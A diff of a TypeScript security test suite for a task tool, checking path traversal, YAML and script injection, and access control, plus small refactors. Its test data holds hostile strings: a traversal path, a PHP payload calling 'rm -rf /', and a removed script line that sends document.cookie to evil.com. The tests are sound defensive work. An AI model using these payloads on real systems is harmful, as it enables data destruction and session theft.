@@ -150,11 +150,12 @@ describe("Security: Path Traversal in task_dir", () => {
 
   it("task_archive with path traversal agent_workspace (dry_run) should reveal planned paths without creating files", async () => {
     // Create a real task first
-    const { taskDir } = await createTask(env.specTaskDir, "archive-traversal-task", {
+    const { taskDir, taskRoot } = await createTask(env.specTaskDir, "archive-traversal-task", {
       title: "Archive Traversal Test",
+      brief: "## 目标\n路径遍历安全测试",
     });
     // Complete the task first
-    await writeFile(join(taskDir, "checklist.md"), "- [x] Done\n", "utf-8");
+    await writeFile(join(taskRoot, "brief.md"), "# Archive Traversal Test\n\nTest brief.\n", "utf-8");
 
     // Use a traversed agent_workspace pointing outside the test env
     const evilWorkspace = join(env.projectRoot, "sentinel-no-status", "../../../../tmp/evil-workspace");
@@ -191,8 +192,9 @@ describe("Security: YAML Injection", () => {
   it("should round-trip task with YAML special characters in title", async () => {
     // Title with characters that could break YAML parsing
     const maliciousTitle = '": key: value\n- injected_list_item\n<script>alert(1)</script>';
-    const { taskDir } = await createTask(env.specTaskDir, "yaml-inject-task", {
+    const { taskDir, taskRoot } = await createTask(env.specTaskDir, "yaml-inject-task", {
       title: maliciousTitle,
+      brief: "## 目标\nYAML 注入安全测试",
     });
 
     // Read back via helpers (YAML.parse)
@@ -212,6 +214,7 @@ describe("Security: YAML Injection", () => {
   it("should treat script injection in status.yaml as plain text when read back", async () => {
     const { taskDir } = await createTask(env.specTaskDir, "script-inject-task", {
       title: "Script Inject Test",
+      brief: "## 目标\n脚本注入安全测试",
     });
 
     // Manually write a status.yaml with script injection in error messages
@@ -220,11 +223,6 @@ describe("Security: YAML Injection", () => {
       step: "injection-step",
       message: '<?php echo "pwned"; system("rm -rf /"); ?>',
       retry_count: 0,
-      timestamp: new Date().toISOString(),
-    });
-    status.alerts.push({
-      type: "security",
-      message: '<script>window.location="http://evil.com?cookie="+document.cookie</script>',
       timestamp: new Date().toISOString(),
     });
     await writeFile(join(taskDir, "status.yaml"), YAML.stringify(status), "utf-8");
@@ -241,19 +239,16 @@ describe("Security: YAML Injection", () => {
     expect(errorStep.message).toContain("pwned");
     expect(errorStep.step).toBe("injection-step");
 
-    const alertEntry = data.alerts[0];
-    expect(alertEntry.message).toContain("<script>");
-    expect(alertEntry.message).toContain("evil.com");
-
     // Also verify via raw read that it's stored as text, not parsed as YAML directives
     const rawContent = await readFile(join(taskDir, "status.yaml"), "utf-8");
     expect(rawContent).toContain("<?php");
-    expect(rawContent).toContain("<script>");
+    expect(rawContent).toContain("pwned");
   });
 
   it("should handle colons and YAML-like structures in verification criteria", async () => {
     const { taskDir } = await createTask(env.specTaskDir, "yaml-criteria-task", {
       title: "YAML Criteria Test",
+      brief: "## 目标\nYAML 标准注入安全测试",
     });
 
     // Start the task (pending → assigned → running)
@@ -299,14 +294,15 @@ describe("Security: Access Control", () => {
     // Use /dev/null/impossible — mkdir under /dev/null fails with ENOTDIR
     const readOnlyDir = "/dev/null/impossible";
 
-    // The function should throw (not silently succeed or hang)
+    // The function should return an error result (not throw or crash)
     // The important thing is: no files are created outside the workspace
-    await expect(
-      executeTaskCreate("test-13", {
-        task_name: "read-only-attack",
-        project_root: readOnlyDir,
-      })
-    ).rejects.toThrow();
+    const result = await executeTaskCreate("test-13", {
+      task_name: "read-only-attack",
+      project_root: readOnlyDir,
+    });
+    const data = parseResponse(result);
+    // Either INVALID_PARAMS (from validateWorkspacePath) or success=false from mkdir failure
+    expect(data.success).toBe(false);
 
     // Verify no files were created under /dev
     const testDir = join(readOnlyDir, "spec-task", "read-only-attack");
@@ -314,10 +310,11 @@ describe("Security: Access Control", () => {
   });
 
   it("task_archive with non-existent agent_workspace should create directories recursively", async () => {
-    const { taskDir } = await createTask(env.specTaskDir, "archive-new-workspace", {
+    const { taskDir, taskRoot } = await createTask(env.specTaskDir, "archive-new-workspace", {
       title: "Archive New Workspace Test",
+      brief: "## 目标\n新工作空间归档测试",
     });
-    await writeFile(join(taskDir, "brief.md"), "# Archive New Workspace Test\n\nTest brief.\n", "utf-8");
+    await writeFile(join(taskRoot, "brief.md"), "# Archive New Workspace Test\n\nTest brief.\n", "utf-8");
 
     // Create a non-existent agent_workspace path (nested, doesn't exist yet)
     const newWorkspace = join(env.projectRoot, "brand", "new", "workspace", "path");
@@ -419,6 +416,7 @@ describe("Security: Additional Edge Cases", () => {
     const result = await executeTaskCreate("test-19", {
       task_name: "safe-task-name",
       project_root: env.projectRoot,
+      brief: "## 目标\n安全路径验证",
     });
     const data = parseResponse(result);
     expect(data.success).toBe(true);
